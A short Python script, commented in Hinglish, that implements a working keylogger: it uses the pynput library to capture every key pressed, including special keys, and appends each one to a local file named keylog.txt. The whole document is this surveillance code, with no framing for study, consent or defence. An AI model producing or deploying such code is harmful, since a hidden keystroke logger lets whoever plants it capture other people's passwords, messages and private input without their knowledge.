from pynput import keyboard

# File jahan log save hoga
log_file = "keylog.txt"

def on_press(key):
    try:
        key_data = f"Key {key.char} pressed\n"
    except AttributeError:
        key_data = f"Special key {key} pressed\n"

    # Save to file
    with open(log_file, "a") as f:
        f.write(key_data)

# Listener start karo
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
